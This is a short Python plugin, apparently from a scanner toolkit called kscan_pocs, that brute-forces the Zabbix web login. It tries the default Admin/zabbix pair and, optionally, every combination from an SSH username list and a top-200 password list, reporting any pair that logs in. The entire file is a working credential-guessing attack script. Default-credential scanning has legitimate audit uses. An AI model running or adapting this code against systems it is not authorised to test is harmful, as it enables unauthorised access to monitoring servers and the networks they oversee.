# coding: utf-8
# @Time    : 2020/9/21 8:16
# @Author    : WANSUIYE
# @File    : zabbixCheck.py
# @Project: kscan_pocs

import requests

from .utils.getFile import get_var_items,genUserPasswd

def get_dict(flag=1):
	if flag==1:
		user_list=['Admin']
		passwd_list=['zabbix']
	else:
		user_list = get_var_items('ssh_user.txt')
		user_list.add('Admin')
		passwd_list = get_var_items('top200passwd.txt')
		passwd_list.add('zabbix')

	return genUserPasswd(user_list, passwd_list)

def bf(target,user,passwd,timeout):
	url = '{}://{}:{}/index.php'.format(target[0], target[1], int(target[2]))
	retVal=''
	try:
		data = {"name": user, "password": passwd, "enter": "Sign in"}
		res = requests.post(url,data = data, verify=False, timeout=timeout)
		if 'Sign out' in res.text:
			retVal = '{}/{}'.format(user,passwd)
	except:
		pass
	return retVal

def check(target,**kwargs):
	timeout = kwargs.get('timeout') or 3
	flag = kwargs.get('flag') or 1
	retVal={'service':'zabbix','status':1,'url':''}

	for user, passwd in get_dict(flag):
		res = bf(target,user,passwd,timeout)
		if res:
			retVal['status'] = 2
			retVal['url'] += res+'\n'

	return retVal